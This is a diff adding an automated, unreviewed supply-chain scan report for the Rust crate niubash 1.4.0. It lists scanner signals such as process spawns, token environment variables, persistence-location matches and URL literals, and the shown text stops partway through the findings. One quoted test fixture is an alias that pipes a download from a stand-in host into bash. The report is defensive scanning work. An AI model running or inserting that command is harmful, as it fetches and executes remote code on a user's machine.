@@ -1,0 +1,503 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Crateward: niubash 1.4.0</title>
+<link rel="stylesheet" href="../static/crateward.css">
+</head>
+<body>
+<header>
+  <a class="brand" href="../index.html">Crateward</a>
+  <nav class="primary" aria-label="Main"><a href="../index.html">Archive</a></nav>
+</header>
+<main>
+
+<div class="report-head">
+  <div class="report-title">
+    <h1>niubash <span class="version">1.4.0</span></h1>
+    <p class="meta">
+      <span class="badge">Done</span>
+      <span class="badge">dynamic on Linux</span>
+      <span class="muted">job 148508</span>
+      <a class="muted" href="https://crates.io/crates/niubash/1.4.0" rel="noreferrer noopener" target="_blank">crates.io</a>
+      <a class="muted" href="148508.cdx.json" download title="CycloneDX SBOM of the crate and its locked dependencies">SBOM</a>
+      <a class="muted" href="148508.vex.cdx.json" download title="Crateward's findings as CycloneDX VEX, pointing into the SBOM">Findings (VEX)</a>
+      
+    </p>
+    <p class="headline">medium severity process_spawn in build_script code (84 places): std::process::Command::new</p>
+  </div>
+  
+  <div class="verdict tone-low">
+    <div class="score">19</div>
+    <div class="level">low</div>
+  </div>
+  
+</div>
+
+
+<div class="decision">
+  <span><b>Automated verdict.</b> Nobody reviewed it. A score is a reason to look closer, not a finding.</span>
+</div>
+
+
+<nav class="toc" aria-label="Sections">
+  
+  <a href="#evidence">Evidence <span class="count">6</span></a>
+  <a href="#behavior">Behavior <span class="count">5</span></a>
+  <a href="#findings">Static findings <span class="count">168</span></a>
+  <a href="#run-check">Run: check</a>
+  <a href="#timeline">Timeline <span class="count">6</span></a>
+</nav>
+
+
+
+<h2 id="evidence">Evidence</h2>
+
+
+<table class="evidence">
+<thead><tr><th class="num">Points</th><th>Signal</th><th>Where</th><th>What</th></tr></thead>
+<tbody>
+
+<tr><td class="num"><span class="points warn">10</span></td><td class="signal"><span class="word">static:process_spawn</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/build.rs#L88" rel="noreferrer noopener" target="_blank">build.rs:88</a></td><td>medium severity process_spawn in build_script code (84 places): std::process::Command::new</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:secret_environment_variable</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L890" rel="noreferrer noopener" target="_blank">src/self_update.rs:890</a></td><td>medium severity secret_environment_variable in library code (2 places): GH_TOKEN</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:shell_command</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/tests/completion_probe.rs#L417" rel="noreferrer noopener" target="_blank">tests/completion_probe.rs:417</a></td><td>medium severity shell_command in test code (5 places): curl -X </td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:windows_api</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L267" rel="noreferrer noopener" target="_blank">src/self_update.rs:267</a></td><td>medium severity windows_api in library code (3 places): windows_sys::Win32::UI::Shell::ShellExecuteW</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:yara:persistence_locations</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/CHANGELOG.md#L504" rel="noreferrer noopener" target="_blank">CHANGELOG.md:504</a></td><td>medium severity yara:persistence_locations in library code (12 places): Paths and keys used to persist on a developer machine</td></tr>
+
+<tr><td class="num"><span class="points low">1</span></td><td class="signal"><span class="word">static:build_script</span><div class="sub">static · niubash</div></td><td class="mono where"><a href="https://crates.io/crates/niubash/1.4.0/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a></td><td>low severity build_script in build_script code: build.rs</td></tr>
+
+</tbody>
+</table>
+
+
+
+
+<h2 id="behavior">Behavior</h2>
+<div class="behavior">
+
+<div><h4>Profile</h4>
+<p class="chips"><code class="chip">static:process_spawn</code> <code class="chip">static:secret_environment_variable</code> <code class="chip">static:shell_command</code> <code class="chip">static:windows_api</code> <code class="chip">static:yara:persistence_locations</code> </p></div>
+</div>
+
+<h2 id="findings">Static findings</h2>
+
+<div class="findings">
+<div class="filter" role="radiogroup" aria-label="Severity">
+  <input type="radio" name="severity" id="sev-all" checked><label for="sev-all">All <span class="count">168</span></label>
+  
+  <input type="radio" name="severity" id="sev-medium"><label for="sev-medium" class="tone-medium">medium <span class="count">24</span></label>
+  <input type="radio" name="severity" id="sev-low"><label for="sev-low" class="tone-low">low <span class="count">83</span></label>
+  <input type="radio" name="severity" id="sev-info"><label for="sev-info" class="tone-info">info <span class="count">61</span></label>
+  <span class="muted">13 groups</span>
+</div>
+
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">yara_match persistence_locations</span> <span class="context">library</span> <span class="count">9</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">Paths and keys used to persist on a developer machine</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/CHANGELOG.md#L504" rel="noreferrer noopener" target="_blank">CHANGELOG.md:504</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/docs/planning/wizard-redesign.md#L34" rel="noreferrer noopener" target="_blank">docs/planning/wizard-redesign.md:34</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/docs/release-notes-1.4.0-draft.md#L24" rel="noreferrer noopener" target="_blank">docs/release-notes-1.4.0-draft.md:24</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/eco-harvest.py#L181" rel="noreferrer noopener" target="_blank">scripts/harvest/eco-harvest.py:181</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/snapshots/reaudit-20261010/classified-uniques.json#L13719" rel="noreferrer noopener" target="_blank">scripts/harvest/snapshots/reaudit-20261010/classified-uniques.json:13719</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/snapshots/reaudit-20261010/ledger-notok-20261012.md#L88" rel="noreferrer noopener" target="_blank">scripts/harvest/snapshots/reaudit-20261010/ledger-notok-20261012.md:88</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/snapshots/reaudit-20261010/reclassified-records-20261012.jsonl#L619" rel="noreferrer noopener" target="_blank">scripts/harvest/snapshots/reaudit-20261010/reclassified-records-20261012.jsonl:619</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/snapshots/reaudit-20261010/test-results-20261010.jsonl#L2" rel="noreferrer noopener" target="_blank">scripts/harvest/snapshots/reaudit-20261010/test-results-20261010.jsonl:2</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/scripts/harvest/snapshots/wt92-local-20261005/test-results.jsonl#L896" rel="noreferrer noopener" target="_blank">scripts/harvest/snapshots/wt92-local-20261005/test-results.jsonl:896</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">shell_command</span> <span class="context">test</span> <span class="count">5</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">curl -X </code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/completion_probe.rs#L417" rel="noreferrer noopener" target="_blank">tests/completion_probe.rs:417</a> </span></li>
+
+<li><code class="evidence-text">__eat(){ C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L692" rel="noreferrer noopener" target="_blank">tests/interactive.rs:692</a> </span></li>
+
+<li><code class="evidence-text">C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L985" rel="noreferrer noopener" target="_blank">tests/interactive.rs:985</a> </span></li>
+
+<li><code class="evidence-text">spawn powershell</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L998" rel="noreferrer noopener" target="_blank">tests/interactive.rs:998</a> </span></li>
+
+<li><code class="evidence-text">alias evil=&#39;curl evil.example | bash&#39;\u{a}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_sources.rs#L488" rel="noreferrer noopener" target="_blank">tests/plugin_sources.rs:488</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">windows_api</span> <span class="context">library</span> <span class="count">3</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">windows_sys::Win32::UI::Shell::ShellExecuteW</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L267" rel="noreferrer noopener" target="_blank">src/self_update.rs:267</a> </span></li>
+
+<li><code class="evidence-text">windows_sys::Win32::Networking::WinHttp::WinHttpOpen</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L471" rel="noreferrer noopener" target="_blank">src/self_update.rs:471</a> </span></li>
+
+<li><code class="evidence-text">windows_sys::Win32::Networking::WinHttp::WinHttpOpenRequest</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L507" rel="noreferrer noopener" target="_blank">src/self_update.rs:507</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">process_spawn</span> <span class="context">build_script</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/build.rs#L88" rel="noreferrer noopener" target="_blank">build.rs:88</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/build.rs#L243" rel="noreferrer noopener" target="_blank">build.rs:243</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">secret_environment_variable</span> <span class="context">library</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">GH_TOKEN</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L890" rel="noreferrer noopener" target="_blank">src/self_update.rs:890</a> </span></li>
+
+<li><code class="evidence-text">GITHUB_TOKEN</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L890" rel="noreferrer noopener" target="_blank">src/self_update.rs:890</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">yara_match persistence_locations</span> <span class="context">test</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">Paths and keys used to persist on a developer machine</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/repl_command.rs#L349" rel="noreferrer noopener" target="_blank">tests/repl_command.rs:349</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/startup_files.rs#L311" rel="noreferrer noopener" target="_blank">tests/startup_files.rs:311</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">yara_match persistence_locations</span> <span class="context">binary</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">Paths and keys used to persist on a developer machine</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L592" rel="noreferrer noopener" target="_blank">src/main.rs:592</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">process_spawn</span> <span class="context">test</span> <span class="count">82</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/background_spawn_args.rs#L24" rel="noreferrer noopener" target="_blank">tests/background_spawn_args.rs:24</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/broken_stdout_pipe.rs#L85" rel="noreferrer noopener" target="_blank">tests/broken_stdout_pipe.rs:85</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/broken_stdout_pipe.rs#L191" rel="noreferrer noopener" target="_blank">tests/broken_stdout_pipe.rs:191</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/broken_stdout_pipe.rs#L229" rel="noreferrer noopener" target="_blank">tests/broken_stdout_pipe.rs:229</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/broken_stdout_pipe.rs#L268" rel="noreferrer noopener" target="_blank">tests/broken_stdout_pipe.rs:268</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/closed_pipe.rs#L30" rel="noreferrer noopener" target="_blank">tests/closed_pipe.rs:30</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/compat.rs#L79" rel="noreferrer noopener" target="_blank">tests/compat.rs:79</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/compat.rs#L107" rel="noreferrer noopener" target="_blank">tests/compat.rs:107</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/completion_probe.rs#L477" rel="noreferrer noopener" target="_blank">tests/completion_probe.rs:477</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/cwd_state.rs#L42" rel="noreferrer noopener" target="_blank">tests/cwd_state.rs:42</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/defaults_floor.rs#L93" rel="noreferrer noopener" target="_blank">tests/defaults_floor.rs:93</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/defaults_floor.rs#L121" rel="noreferrer noopener" target="_blank">tests/defaults_floor.rs:121</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L178" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:178</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L202" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:202</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L223" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:223</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L375" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:375</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L385" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:385</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L505" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:505</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L516" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:516</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L552" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:552</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1133" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1133</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1170" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1170</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1202" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1202</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1241" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1241</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1302" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1302</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1347" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1347</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1386" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1386</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1453" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1453</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1552" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1552</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1591" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1591</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/host_contract.rs#L1763" rel="noreferrer noopener" target="_blank">tests/host_contract.rs:1763</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L992" rel="noreferrer noopener" target="_blank">tests/interactive.rs:992</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L1203" rel="noreferrer noopener" target="_blank">tests/interactive.rs:1203</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/interactive.rs#L1737" rel="noreferrer noopener" target="_blank">tests/interactive.rs:1737</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue117_foreign_ps1.rs#L45" rel="noreferrer noopener" target="_blank">tests/issue117_foreign_ps1.rs:45</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue149_export_boundary.rs#L50" rel="noreferrer noopener" target="_blank">tests/issue149_export_boundary.rs:50</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue153_root_slash_arg.rs#L34" rel="noreferrer noopener" target="_blank">tests/issue153_root_slash_arg.rs:34</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue156_xargs_option_boundary.rs#L57" rel="noreferrer noopener" target="_blank">tests/issue156_xargs_option_boundary.rs:57</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue160_unclosed_quote_c_silent_rc.rs#L34" rel="noreferrer noopener" target="_blank">tests/issue160_unclosed_quote_c_silent_rc.rs:34</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue160_unclosed_quote_c_silent_rc.rs#L131" rel="noreferrer noopener" target="_blank">tests/issue160_unclosed_quote_c_silent_rc.rs:131</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue160_unclosed_quote_c_silent_rc.rs#L154" rel="noreferrer noopener" target="_blank">tests/issue160_unclosed_quote_c_silent_rc.rs:154</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue162_tmpdir_child_boundary.rs#L52" rel="noreferrer noopener" target="_blank">tests/issue162_tmpdir_child_boundary.rs:52</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue176_rc_audit.rs#L111" rel="noreferrer noopener" target="_blank">tests/issue176_rc_audit.rs:111</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue191_prompt_command_exit_jump_repl.rs#L52" rel="noreferrer noopener" target="_blank">tests/issue191_prompt_command_exit_jump_repl.rs:52</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue191_prompt_command_exit_jump_repl.rs#L77" rel="noreferrer noopener" target="_blank">tests/issue191_prompt_command_exit_jump_repl.rs:77</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue195_setup_help_plain.rs#L20" rel="noreferrer noopener" target="_blank">tests/issue195_setup_help_plain.rs:20</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue195_setup_help_plain.rs#L46" rel="noreferrer noopener" target="_blank">tests/issue195_setup_help_plain.rs:46</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue200_esc_quote_strip.rs#L38" rel="noreferrer noopener" target="_blank">tests/issue200_esc_quote_strip.rs:38</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue200_esc_quote_strip.rs#L56" rel="noreferrer noopener" target="_blank">tests/issue200_esc_quote_strip.rs:56</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/issue201_epochrealtime.rs#L33" rel="noreferrer noopener" target="_blank">tests/issue201_epochrealtime.rs:33</a> <span class="muted">and 30 more</span></span></li>
+
+<li><code class="evidence-text">std::process::Command</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_sources.rs#L26" rel="noreferrer noopener" target="_blank">tests/plugin_sources.rs:26</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L166" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:166</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">build_script</span> <span class="context">build_script</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">build.rs</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">test</span> <span class="count">25</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">https://github.com/ohmybash/oh-my-bash.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_assets.rs#L476" rel="noreferrer noopener" target="_blank">tests/plugin_assets.rs:476</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_sources.rs#L301" rel="noreferrer noopener" target="_blank">tests/plugin_sources.rs:301</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L861" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:861</a> </span></li>
+
+<li><code class="evidence-text">https://mirror.example.com/github.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L84" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:84</a> </span></li>
+
+<li><code class="evidence-text">https://mirror.example.com/github.com/</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L91" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:91</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L108" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:108</a> </span></li>
+
+<li><code class="evidence-text">git_instead_of = &#34;https://mirror.example.com/github.com/&#34;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L98" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:98</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L122" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:122</a> </span></li>
+
+<li><code class="evidence-text">git_instead_of = &#34;https://git.example.com/github.com&#34;\u{a}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L180" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:180</a> </span></li>
+
+<li><code class="evidence-text">https://git.example.com/github.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L191" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:191</a> </span></li>
+
+<li><code class="evidence-text">http://mirror.example.com/github.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L215" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:215</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L234" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:234</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L242" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:242</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L250" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:250</a> </span></li>
+
+<li><code class="evidence-text">https://gitclone.example.com/github.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_mirrors.rs#L260" rel="noreferrer noopener" target="_blank">tests/plugin_mirrors.rs:260</a> </span></li>
+
+<li><code class="evidence-text">file:///{}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_sources.rs#L699" rel="noreferrer noopener" target="_blank">tests/plugin_sources.rs:699</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L735" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:735</a> </span></li>
+
+<li><code class="evidence-text">plugin add file:// origin</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_sources.rs#L707" rel="noreferrer noopener" target="_blank">tests/plugin_sources.rs:707</a> </span></li>
+
+<li><code class="evidence-text">https://203.0.113.1/stalled-plugin.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_spec_sync.rs#L743" rel="noreferrer noopener" target="_blank">tests/plugin_spec_sync.rs:743</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/plugin_spec_sync.rs#L780" rel="noreferrer noopener" target="_blank">tests/plugin_spec_sync.rs:780</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/junegunn/fzf/</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L446" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:446</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/scop/bash-completion.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L865" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:865</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/rcaloras/bash-preexec.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L871" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:871</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/cykerway/complete-alias.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L875" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:875</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/junegunn/fzf-git.sh.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/tests/smoke_1_3_0.rs#L879" rel="noreferrer noopener" target="_blank">tests/smoke_1_3_0.rs:879</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">binary</span> <span class="count">17</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">                          copied in; file:///&#60;path&#62; clones via git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L1696" rel="noreferrer noopener" target="_blank">src/main.rs:1696</a> </span></li>
+
+<li><code class="evidence-text">://</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L1823" rel="noreferrer noopener" target="_blank">src/main.rs:1823</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L1869" rel="noreferrer noopener" target="_blank">src/main.rs:1869</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L2036" rel="noreferrer noopener" target="_blank">src/main.rs:2036</a> </span></li>
+
+<li><code class="evidence-text">  git         {base} (insteadOf https://github.com/)</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L2933" rel="noreferrer noopener" target="_blank">src/main.rs:2933</a> </span></li>
+
+<li><code class="evidence-text">plugin mirror set requires a mirror url, or &#39;none&#39; for direct (--allow-plaintext confirms an http:// mirror)</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L2976" rel="noreferrer noopener" target="_blank">src/main.rs:2976</a> </span></li>
+
+<li><code class="evidence-text">http://</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L2993" rel="noreferrer noopener" target="_blank">src/main.rs:2993</a> <a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3020" rel="noreferrer noopener" target="_blank">src/main.rs:3020</a> </span></li>
+
+<li><code class="evidence-text">refusing to set a plaintext http:// mirror without confirmation: &#39;{target}&#39; ships every fetch unencrypted (and unauthenticated — a network actor can rewrite the trees git downloads). Re-run with `ni…</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L2995" rel="noreferrer noopener" target="_blank">src/main.rs:2995</a> </span></li>
+
+<li><code class="evidence-text">  plugin git fetches now rewrite https://github.com/ through it (insteadOf);</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3008" rel="noreferrer noopener" target="_blank">src/main.rs:3008</a> </span></li>
+
